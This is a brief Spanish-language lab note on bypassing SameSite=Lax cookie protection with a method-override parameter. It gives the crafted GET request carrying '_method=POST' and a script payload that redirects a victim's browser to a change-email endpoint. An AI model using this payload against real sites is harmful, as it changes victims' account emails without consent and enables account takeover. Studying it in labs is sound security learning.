# Bypass de SameSite Lax con método override

Tags: #CSRF #BurpSuite #XSRF   

```bash 
En este lab se debe sobreescribir el método. Aunque el método permitido solo sea POST, de la siguiente manera al cambiar el método a GET, el backend pensará que se esta tramitando por POST si es que esta mal configurado 
```

```bash 
	GET /my-account/change-email?email=a@test.com&_method=POST

	# &_method=  = Para cambiar el método a POST desde un método GET 
```

```javascript 
<script>
	location="https://web.com/my-account/change-email?email=a@test.com&_method=POST";
</script>
```